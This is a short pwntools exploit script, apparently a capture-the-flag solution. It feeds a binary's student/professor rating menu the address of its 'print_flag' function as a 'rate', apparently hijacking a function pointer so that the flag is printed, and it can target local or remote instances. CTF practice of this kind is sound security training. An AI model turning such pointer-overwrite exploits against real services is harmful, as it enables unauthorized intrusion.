from pwn import *

elf = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *func",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path) 


p.sendafter(b'Student name: ', b'A')
p.sendafter(b'Professor name: ', b'B')
p.sendafter(b'Who will give the rate: ', b'A')
p.sendafter(b'Who will receive the rate: ', b'B')
p.sendlineafter(b'Input the rate: ', str(elf.sym['print_flag']).encode())


p.sendafter(b'Student name: ', b'C')
p.sendafter(b'Professor name: ', b'D')
p.sendafter(b'Who will give the rate: ', b'B')
p.sendafter(b'Who will receive the rate: ', b'D')
p.sendlineafter(b'Input the rate: ', b'1337')

success(p.stream().decode())

